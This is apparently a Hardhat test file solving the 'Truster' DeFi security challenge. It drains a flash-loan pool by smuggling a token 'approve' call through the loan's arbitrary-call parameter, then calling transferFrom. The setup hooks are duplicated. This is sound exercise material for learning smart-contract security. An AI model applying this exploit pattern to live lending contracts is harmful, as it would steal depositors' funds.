const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit in multiple transaction', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const target = this.token.address;
        const data = ethers.utils.arrayify(
          this.token.interface.encodeFunctionData("approve", [
            attacker.address,
            (TOKENS_IN_POOL)
          ])
        );
        await this.pool.connect(attacker).flashLoan(0, attacker.address, target, data);
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, (TOKENS_IN_POOL));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });

    before(async function () {
      /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
      [deployer, attacker] = await ethers.getSigners();

      const DamnValuableToken = await ethers.getContractFactory(
        "DamnValuableToken",
        deployer
      );
      const TrusterLenderPool = await ethers.getContractFactory(
        "TrusterLenderPool",
        deployer
      );

      this.token = await DamnValuableToken.deploy();
      this.pool = await TrusterLenderPool.deploy(this.token.address);

      await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

      expect(await this.token.balanceOf(this.pool.address)).to.equal(
        TOKENS_IN_POOL
      );

      expect(await this.token.balanceOf(attacker.address)).to.equal("0");
    });

    it("Exploit in a single transaction", async function () {
      /** CODE YOUR EXPLOIT HERE  */
      // Deploy attacker contract here.
      const _attacker = await ethers.getContractFactory("hackTruster", attacker);
      this.attacker_contract = await _attacker.deploy(this.token.address);
      await this.attacker_contract.hackit(this.pool.address, attacker.address);
    });
    after(async function () {
      /** SUCCESS CONDITIONS */

      // Attacker has taken all tokens from the pool
      expect(await this.token.balanceOf(attacker.address)).to.equal(
        TOKENS_IN_POOL
      );
      expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
    });    
});

